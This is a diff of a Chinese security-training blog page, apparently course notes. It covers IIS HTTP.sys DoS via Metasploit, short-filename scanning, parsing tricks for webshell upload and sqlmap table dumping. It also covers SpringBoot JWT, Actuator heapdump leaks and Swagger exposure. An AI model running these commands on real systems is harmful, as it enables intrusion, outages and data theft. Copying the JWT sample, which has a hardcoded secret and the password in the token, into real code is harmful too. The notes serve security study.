-<h2 id="ASP-中间件-CVE-短文件-解析-写权限"><a href="#ASP-中间件-CVE-短文件-解析-写权限" class="headerlink" title="ASP-中间件-CVE&amp;短文件&amp;解析&amp;写权限"></a>ASP-中间件-CVE&amp;短文件&amp;解析&amp;写权限</h2><h3 id="HTTP-SYS（CVE-2015-1635）"><a href="#HTTP-SYS（CVE-2015-1635）" class="headerlink" title="HTTP.SYS（CVE-2015-1635）"></a>HTTP.SYS（CVE-2015-1635）</h3><ul>
-<li>1、漏洞描述<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;远程执行代码漏洞存在于 HTTP 协议堆栈 (HTTP.sys) 中，当 HTTP.sys 未正确分析经特殊设计的 HTTP 请求时会导致此漏洞。 成功利用此漏洞的攻击者可以在系统帐户的上下文中执行任意代码。</li>
-<li>2、影响版本<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Windows 7、Windows Server 2008 R2、Windows 8、Windows Server 2012、Windows 8.1 和 Windows Server 2012 R2</li>
-<li>3、漏洞利用条件<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;安装了IIS6.0以上的Windows 7、Windows Server 2008 R2、Windows 8、Windows Server 2012、Windows 8.1 和 Windows Server 2012 R2版本</li>
-<li>4、漏洞复现(kali)  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">msfconsole  </span><br><span class="line">use auxiliary/dos/http/ms15_034_ulonglongadd</span><br><span class="line">set rhosts xx.xx.xx.xx</span><br><span class="line">set rport xx</span><br><span class="line">run</span><br></pre></td></tr></table></figure></li>
-</ul>
-<h3 id="IIS短文件"><a href="#IIS短文件" class="headerlink" title="IIS短文件"></a>IIS短文件</h3><ul>
-<li>1、描述：<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;此漏洞实际是由HTTP请求中旧DOS 8.3名称约定(SFN)的代字符(~)波浪号引起的。它允许远程攻击者在Web根目录下公开文件和文件夹名称(不应该可被访问)。攻击者可以找到通常无法从外部直接访问的重要文件,并获取有关应用程序基础结构的信息。</li>
-<li>2、漏洞成因:<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;为了兼容16位MS-DOS程序,Windows为文件名较长的文件(和文件夹)生成了对应的windows 8.3短文件名。在Windows下查看对应的短文件名,可以使用命令dir &#x2F;x</li>
-<li>3、应用场景：<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;后台路径获取，数据库文件获取，其他敏感文件获取等</li>
-<li>4、利用工具：<br><a target="_blank" rel="noopener" href="https://github.com/irsdl/IIS-ShortName-Scanner">https://github.com/irsdl/IIS-ShortName-Scanner</a><br><a target="_blank" rel="noopener" href="https://github.com/lijiejie/IIS_shortname_Scanner">https://github.com/lijiejie/IIS_shortname_Scanner</a></li>
-</ul>
-<h3 id="IIS文件解析"><a href="#IIS文件解析" class="headerlink" title="IIS文件解析"></a>IIS文件解析</h3><p>IIS 6 解析漏洞<br>1、该版本默认会将*.asp;.jpg 此种格式的文件名，当成Asp解析<br>2、该版本默认会将*.asp&#x2F;目录下的所有文件当成Asp解析。<br>如：logo.asp;.jpg xx.asp&#x2F;logo.jpg<br>IIS 7.x 解析漏洞<br>在一个文件路径(&#x2F;xx.jpg)后面加上&#x2F;xx.php会将&#x2F;xx.jpg&#x2F;xx.php 解析为php文件<br>应用场景：配合文件上传获取Webshell  </p>
-<h3 id="IIS写权限"><a href="#IIS写权限" class="headerlink" title="IIS写权限"></a>IIS写权限</h3><p>IIS&lt;&#x3D;6.0 目录权限开启写入，开启WebDAV，设置为允许<br>参考利用：<a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/2050105">https://cloud.tencent.com/developer/article/2050105</a>  </p>
-<h2 id="ASP-SQL注入-SQLMAP使用-ACCESS注入"><a href="#ASP-SQL注入-SQLMAP使用-ACCESS注入" class="headerlink" title="ASP-SQL注入-SQLMAP使用&amp;ACCESS注入"></a>ASP-SQL注入-SQLMAP使用&amp;ACCESS注入</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ACCESS数据库无管理帐号密码，顶级架构为表名，列名（字段），数据，所以在注入猜解中一般采用字典猜解表和列再获取数据，猜解简单但又可能出现猜解不到的情况，由于Access数据库在当前安全发展中已很少存在，故直接使用SQLMAP注入，后续再说其他。  </p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;&quot; --tables //获取表名</span><br><span class="line">python sqlmap.py -u &quot;&quot; --columns -T admin //获取admin表名下的列名</span><br><span class="line">python sqlmap.py -u &quot;&quot; --dump -C &quot;&quot; -T admin  //获取表名下的列名数据</span><br></pre></td></tr></table></figure>
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-
- 
-
-      
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2023/10/18/40%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91-JavaEE%E5%BA%94%E7%94%A8/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.png">
-      <meta itemprop="name" content="z7">
-      <meta itemprop="description" content="师从小迪，欢迎各位来当迪总的韭菜">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="个人博客">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2023/10/18/40%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91-JavaEE%E5%BA%94%E7%94%A8/" class="post-title-link" itemprop="url">40安全开发-JavaEE应用</a>
-        </h2>
-
-        <div class="post-meta">
-	
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2023-10-18 10:40:08" itemprop="dateCreated datePublished" datetime="2023-10-18T10:40:08+08:00">2023-10-18</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2023-11-06 21:11:31" itemprop="dateModified" datetime="2023-11-06T21:11:31+08:00">2023-11-06</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">网络安全</span></a>
-                </span>
-            </span>
-
-          <br>
-            <span class="post-meta-item" title="本文字数">
-              <span class="post-meta-item-icon">
-                <i class="far fa-file-word"></i>
-              </span>
-                <span class="post-meta-item-text">本文字数：</span>
-              <span>2.4k</span>
-            </span>
-            <span class="post-meta-item" title="阅读时长">
-              <span class="post-meta-item-icon">
-                <i class="far fa-clock"></i>
-              </span>
-                <span class="post-meta-item-text">阅读时长 &asymp;</span>
-              <span>2 分钟</span>
-            </span>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h2 id="思维导图"><a href="#思维导图" class="headerlink" title="思维导图"></a>思维导图</h2><p>见 <a target="_blank" rel="noopener" href="http://z7yy.top/2023/10/07/22%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91-php%E5%BA%94%E7%94%A8/">22安全开发</a></p>
-<h2 id="知识点："><a href="#知识点：" class="headerlink" title="知识点："></a>知识点：</h2><ul>
-<li>50、JavaEE-SpringBoot-身份鉴权-JWT技术</li>
-<li>51、JavaEE-SpringBoot-打包部署-JAR&amp;WAR</li>
-</ul>
-<h2 id="章节点"><a href="#章节点" class="headerlink" title="章节点"></a>章节点</h2><ul>
-<li>1、PHP：<br>功能：新闻列表，会员中心，资源下载，留言版，后台模块，模版引用，框架开发等<br>技术：输入输出，超全局变量，数据库操作，逻辑架构，包含上传&amp;下载删除;<br>技术：JS&amp;CSS混用，Cookie,Session操作，MVC架构，ThinkPHP引用等。<br>安全：原生PHP开发安全，模版引用安全，第三方插件安全，TP框架安全等  </li>
-<li>2、JS：<br>功能：登录验证，文件操作，SQL操作，云应用接入，框架开发，打包器使用等<br>技术：原生开发，DOM，常见库使用，框架开发（Vue，NodeJS），打包器(Webpack)等<br>安全：原生开发安全，NodeJS安全，Vue安全，打包器Webpack安全，三方库安全问题等  </li>
-<li>3、Java：<br>功能：数据库操作，文件操作，序列化数据，身份验证，框架开发，第三方库使用等.<br>框架库：MyBatis，SpringMVC，SpringBoot，Shiro，Log4j，FastJson等<br>技术：Servlet，Listen，Filter，Interceptor，JWT，AOP，待补充<br>安全：SQL注入，RCE执行，反序列化，脆弱验证，未授权访问，待补充<br>安全：原生开发安全，第三方框架安全，第三方库安全等，架构分析，待补充</li>
-</ul>
-<p> <img src="/2023/10/18/40%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91-JavaEE%E5%BA%94%E7%94%A8/JWT.png"></p>
-<h2 id="SpringBoot-身份鉴权-JWT技术"><a href="#SpringBoot-身份鉴权-JWT技术" class="headerlink" title="SpringBoot-身份鉴权-JWT技术"></a>SpringBoot-身份鉴权-JWT技术</h2><p>[<a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/394138133]">https://zhuanlan.zhihu.com/p/394138133]</a><br>JWT(JSON Web Token)是由服务端用加密算法对信息签名来保证其完整性和不可伪造；<br>Token里可以包含所有必要信息，这样服务端就无需保存任何关于用户或会话的信息；<br>JWT用于身份认证、会话维持等。由三部分组成，header、payload与signature。<br>参考：<a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/2101634">https://cloud.tencent.com/developer/article/2101634</a>  </p>
-<ul>
-<li>1、引入依赖  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">	&lt;groupId&gt;com.auth0&lt;/groupId&gt;</span><br><span class="line">	&lt;artifactId&gt;java-jwt&lt;/artifactId&gt;</span><br><span class="line">	&lt;version&gt;<span class="number">3.4</span><span class="number">.0</span>&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure></li>
-<li>2、创建JWT  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">JWT.create()  </span><br></pre></td></tr></table></figure></li>
-<li>3、配置JWT  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">JWT.create()  </span><br><span class="line"><span class="comment">//header</span></span><br><span class="line">.withHeader(map)</span><br><span class="line"><span class="comment">//payload</span></span><br><span class="line">.withClaim(<span class="string">&quot;userid&quot;</span>,id)</span><br><span class="line">.withClaim(<span class="string">&quot;username&quot;</span>,user)</span><br><span class="line">.withClaim(<span class="string">&quot;password&quot;</span>,pass)</span><br><span class="line"><span class="comment">//signature</span></span><br><span class="line">.sign(Algorithm.HMAC256(<span class="string">&quot;xiaodisec&quot;</span>));</span><br></pre></td></tr></table></figure></li>
-<li>4、解析JWT  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//构建解密注册</span></span><br><span class="line"><span class="type">JWTVerifier</span> <span class="variable">jwt</span> <span class="operator">=</span> JWT.require(Algorithm.HMAC256(<span class="string">&quot;xiaodisec&quot;</span>)).build();</span><br><span class="line"><span class="comment">//解密注册数据</span></span><br><span class="line"><span class="type">DecodedJWT</span> <span class="variable">verify</span> <span class="operator">=</span> jwt.verify(jwtdata);</span><br><span class="line"><span class="comment">//提取解密数据</span></span><br><span class="line"><span class="type">Integer</span> <span class="variable">userid</span> <span class="operator">=</span> verify.getClaim(<span class="string">&quot;userid&quot;</span>).asInt();</span><br></pre></td></tr></table></figure></li>
-<li>5、安全问题<br>参考：<a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/2101634">https://cloud.tencent.com/developer/article/2101634</a></li>
-</ul>
-<h2 id="SpringBoot-打包部署-JAR-WAR"><a href="#SpringBoot-打包部署-JAR-WAR" class="headerlink" title="SpringBoot-打包部署-JAR&amp;WAR"></a>SpringBoot-打包部署-JAR&amp;WAR</h2><p>参考：<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/HyqVt7EMFcuKXfiejtfleg">https://mp.weixin.qq.com/s/HyqVt7EMFcuKXfiejtfleg</a>  </p>
-<h3 id="SpringBoot项目打包在linux服务器中运行"><a href="#SpringBoot项目打包在linux服务器中运行" class="headerlink" title="SpringBoot项目打包在linux服务器中运行:"></a>SpringBoot项目打包在linux服务器中运行:</h3><p>①jar类型项目<br>jar类型项目使用SpringBoot打包插件打包时，会在打成的jar中内置tomcat的jar。<br>所以使用jdk直接运行jar即可，jar项目中功能将代码放到其内置的tomcat中运行。<br>②war类型项目<br>在打包时需要将内置的tomcat插件排除，配置servlet的依赖和修改pom.xml，然后将war文件放到tomcat安装目录webapps下,启动运行tomcat自动解析即可。  </p>
-<h3 id="Jar打包"><a href="#Jar打包" class="headerlink" title="Jar打包"></a>Jar打包</h3><p>报错解决：<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/Mrzhuangr/article/details/124731024">https://blog.csdn.net/Mrzhuangr/article/details/124731024</a><br><a target="_blank" rel="noopener" href="https://blog.csdn.net/wobenqingfeng/article/details/129914639">https://blog.csdn.net/wobenqingfeng/article/details/129914639</a><br>1、maven-clean-package<br>2、java -jar xxxxxx.jar  </p>
-<h3 id="War打包"><a href="#War打包" class="headerlink" title="War打包"></a>War打包</h3><ul>
-<li>1、pom.xml加入或修改：<br><packaging>war</packaging>  </li>
-<li>2、启动类里面加入配置：  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestSwaggerDemoApplication</span> <span class="keyword">extends</span> <span class="title class_">SpringBootServletInitializer</span></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">protected</span> SpringApplicationBuilder <span class="title function_">configure</span><span class="params">(SpringApplicationBuilder builder)</span> &#123;</span><br><span class="line">	<span class="keyword">return</span> builder.sources(TestSwaggerDemoApplication.class);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
-<li>3、maven-clean-package</li>
-<li>4、war放置tomcat后启动</li>
-</ul>
-<p>JAVAEE源码架构：<br>无源码下载泄漏风险<br>源码泄漏也需反编译  </p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-
- 
-
-      
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2023/10/18/39%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91-JavaEE%E5%BA%94%E7%94%A8/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.png">
-      <meta itemprop="name" content="z7">
-      <meta itemprop="description" content="师从小迪，欢迎各位来当迪总的韭菜">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="个人博客">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2023/10/18/39%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91-JavaEE%E5%BA%94%E7%94%A8/" class="post-title-link" itemprop="url">39安全开发-JavaEE应用</a>
-        </h2>
-
-        <div class="post-meta">
-	
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2023-10-18 10:39:58" itemprop="dateCreated datePublished" datetime="2023-10-18T10:39:58+08:00">2023-10-18</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2023-11-06 21:11:21" itemprop="dateModified" datetime="2023-11-06T21:11:21+08:00">2023-11-06</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">网络安全</span></a>
-                </span>
-            </span>
-
-          <br>
-            <span class="post-meta-item" title="本文字数">
-              <span class="post-meta-item-icon">
-                <i class="far fa-file-word"></i>
-              </span>
-                <span class="post-meta-item-text">本文字数：</span>
-              <span>3k</span>
-            </span>
-            <span class="post-meta-item" title="阅读时长">
-              <span class="post-meta-item-icon">
-                <i class="far fa-clock"></i>
-              </span>
-                <span class="post-meta-item-text">阅读时长 &asymp;</span>
-              <span>3 分钟</span>
-            </span>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h2 id="思维导图"><a href="#思维导图" class="headerlink" title="思维导图"></a>思维导图</h2><p>见 <a target="_blank" rel="noopener" href="http://z7yy.top/2023/10/07/22%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91-php%E5%BA%94%E7%94%A8/">22安全开发</a></p>
-<h2 id="知识点："><a href="#知识点：" class="headerlink" title="知识点："></a>知识点：</h2><ul>
-<li>47、JavaEE-SpringBoot-监控系统-Actuator</li>
-<li>48、JavaEE-SpringBoot-接口系统-Swagger</li>
-<li>49、JavaEE-SpringBoot-监控&amp;接口&amp;安全问题</li>
-</ul>
-<h2 id="章节点"><a href="#章节点" class="headerlink" title="章节点"></a>章节点</h2><ul>
-<li>1、PHP：<br>功能：新闻列表，会员中心，资源下载，留言版，后台模块，模版引用，框架开发等<br>技术：输入输出，超全局变量，数据库操作，逻辑架构，包含上传&amp;下载删除;<br>技术：JS&amp;CSS混用，Cookie,Session操作，MVC架构，ThinkPHP引用等。<br>安全：原生PHP开发安全，模版引用安全，第三方插件安全，TP框架安全等  </li>
-<li>2、JS：<br>功能：登录验证，文件操作，SQL操作，云应用接入，框架开发，打包器使用等<br>技术：原生开发，DOM，常见库使用，框架开发（Vue，NodeJS），打包器(Webpack)等<br>安全：原生开发安全，NodeJS安全，Vue安全，打包器Webpack安全，三方库安全问题等  </li>
-<li>3、Java：<br>功能：数据库操作，文件操作，序列化数据，身份验证，框架开发，第三方库使用等.<br>框架库：MyBatis，SpringMVC，SpringBoot，Shiro，Log4j，FastJson等<br>技术：Servlet，Listen，Filter，Interceptor，JWT，AOP，待补充<br>安全：SQL注入，RCE执行，反序列化，脆弱验证，未授权访问，待补充<br>安全：原生开发安全，第三方框架安全，第三方库安全等，，架构分析待补充</li>
-</ul>
-<p> <img src="/2023/10/18/39%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91-JavaEE%E5%BA%94%E7%94%A8/actuator.png"></p>
-<h2 id="SpringBoot-监控系统-Actuator"><a href="#SpringBoot-监控系统-Actuator" class="headerlink" title="SpringBoot-监控系统-Actuator"></a>SpringBoot-监控系统-Actuator</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;SpringBoot Actuator模块提供了生产级别的功能，比如健康检查，审计，指标收集，HTTP跟踪等，帮助我们监控和管理Spring Boot应用。<br>-开发使用：  </p>
-<h3 id="1、引入依赖"><a href="#1、引入依赖" class="headerlink" title="1、引入依赖"></a>1、引入依赖</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">        &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;</span><br><span class="line">        &lt;artifactId&gt;spring-boot-starter-actuator&lt;/artifactId&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure>
-<h3 id="2、配置监控"><a href="#2、配置监控" class="headerlink" title="2、配置监控"></a>2、配置监控</h3><ul>
-<li>暴露:<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#application.properties</span><br><span class="line">management.endpoints.web.exposure.include=*</span><br><span class="line"></span><br><span class="line">#application.yml</span><br><span class="line">management:</span><br><span class="line">  endpoints:</span><br><span class="line">    web:</span><br><span class="line">      exposure:</span><br><span class="line">        include: &#x27;*&#x27;</span><br></pre></td></tr></table></figure></li>
-<li>安全配置：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">#application.properties</span><br><span class="line">management.endpoint.env.enabled=false</span><br><span class="line">management.endpoint.heapdump.enabled=false</span><br><span class="line"></span><br><span class="line">#application.yml</span><br><span class="line">management:</span><br><span class="line">    endpoint:</span><br><span class="line">        heapdump:</span><br><span class="line">            enabled: false #启用接口关闭</span><br><span class="line">    env:</span><br><span class="line">        enabled: false #启用接口关闭</span><br></pre></td></tr></table></figure></li>
-<li>2、1 图像化Server&amp;Client端界面<br>Server：引入Server依赖-开启（@EnableAdminServer）<br>Client：引入Client依赖-配置（连接目标，显示配置等）</li>
-</ul>
-<h3 id="3、安全问题"><a href="#3、安全问题" class="headerlink" title="3、安全问题"></a>3、安全问题</h3><ul>
-<li>heapdump泄漏<br>jvisualvm分析器(安装java后直接搜索jvisualvm)<br>JDumpSpider提取器<br><a target="_blank" rel="noopener" href="https://github.com/whwlsfb/JDumpSpider/releases">https://github.com/whwlsfb/JDumpSpider/releases</a><br>分析提取出敏感信息（配置帐号密码，接口信息 数据库 短信 云应用等配置）  </li>
-<li>其他利用见下文<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/drnrrwfs/article/details/125242990">https://blog.csdn.net/drnrrwfs/article/details/125242990</a><br>分析得到有一些组件（不安全的组件，如log4j）</li>
-</ul>
-<h2 id="SpringBoot-接口系统-Swagger"><a href="#SpringBoot-接口系统-Swagger" class="headerlink" title="SpringBoot-接口系统-Swagger"></a>SpringBoot-接口系统-Swagger</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Swagger是当下比较流行的实时接口文文档生成工具。接口文档是当前前后端分离项目中必不可少的工具，在前后端开发之前，后端要先出接口文档，前端根据接口文档来进行项目的开发，双方开发结束后在进行联调测试。<br>参考：<a target="_blank" rel="noopener" href="https://blog.csdn.net/lsqingfeng/article/details/123678701">https://blog.csdn.net/lsqingfeng/article/details/123678701</a>  </p>
-<h3 id="开发使用"><a href="#开发使用" class="headerlink" title="开发使用"></a>开发使用</h3><ul>
-<li><p>1、引入依赖</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;--<span class="number">2.9</span><span class="number">.2</span>版本--&gt;</span><br><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;io.springfox&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;springfox-swagger2&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;<span class="number">2.9</span><span class="number">.2</span>&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;io.springfox&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;springfox-swagger-ui&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;<span class="number">2.9</span><span class="number">.2</span>&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br><span class="line"></span><br><span class="line">&lt;--<span class="number">3.0</span><span class="number">.0</span>版本--&gt;</span><br><span class="line">&lt;dependency&gt;</span><br><span class="line">  &lt;groupId&gt;io.springfox&lt;/groupId&gt;</span><br><span class="line">  &lt;artifactId&gt;springfox-boot-starter&lt;/artifactId&gt;</span><br><span class="line">  &lt;version&gt;<span class="number">3.0</span><span class="number">.0</span>&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure></li>
-<li><p>2、配置访问</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#application.properties</span><br><span class="line">spring.mvc.pathmatch.matching-strategy=ant-path-matcher</span><br><span class="line"></span><br><span class="line">#application.yml</span><br><span class="line">spring</span><br><span class="line">  mvc:</span><br><span class="line">    pathmatch:</span><br><span class="line">      matching-strategy: ant_path_matcher</span><br></pre></td></tr></table></figure>
-<p>2.X版本启动需要注释@EnableSwagger2<br>3.X版本不需注释，写的话是@EnableOpenApi<br>2.X访问路径：<a href="http://ip:port/swagger-ui.html">http://ip:port/swagger-ui.html</a><br>3.X访问路径：<a href="http://ip:port/swagger-ui/index.html">http://ip:port/swagger-ui/index.html</a>  </p>
-</li>
-<li><p>3、安全问题<br>自动化测试：Postman<br>泄漏应用接口：用户登录，信息显示，上传文件等<br>可用于对未授权访问，信息泄漏，文件上传等安全漏洞的测试.</p>
-</li>
-</ul>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-
- 
-
 
   
   <nav class="pagination">
-    <a class="extend prev" rel="prev" href="/page/2/"><i class="fa fa-angle-left" aria-label="上一页"></i></a><a class="page-number" href="/">1</a><a class="page-number" href="/page/2/">2</a><span class="page-number current">3</span><a class="page-number" href="/page/4/">4</a><span class="space">&hellip;</span><a class="page-number" href="/page/7/">7</a><a class="extend next" rel="next" href="/page/4/"><i class="fa fa-angle-right" aria-label="下一页"></i></a>
+    <a class="extend prev" rel="prev" href="/page/2/"><i class="fa fa-angle-left" aria-label="上一页"></i></a><a class="page-number" href="/">1</a><a class="page-number" href="/page/2/">2</a><span class="page-number current">3</span><a class="page-number" href="/page/4/">4</a><span class="space">&hellip;</span><a class="page-number" href="/page/8/">8</a><a class="extend next" rel="next" href="/page/4/"><i class="fa fa-angle-right" aria-label="下一页"></i></a>
   </nav>
 
 
@@ -1499,7 +1485,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">68</span>
+          <span class="site-state-item-count">71</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -1575,19 +1561,19 @@
     <span class="post-meta-item-icon">
       <i class="fa fa-chart-area"></i>
     </span>
-    <span title="站点总字数">173k</span>
+    <span title="站点总字数">181k</span>
     <span class="post-meta-divider">|</span>
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
-    <span title="站点阅读时长">2:37</span>
+    <span title="站点阅读时长">2:45</span>
 </div>
   <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
   </div>
 
 <div class="theme-info">
   <div class="powered-by"></div>
-  <span class="post-count">博客全站共64.1k字</span>
+  <span class="post-count">博客全站共67.9k字</span>
 </div>
 
 
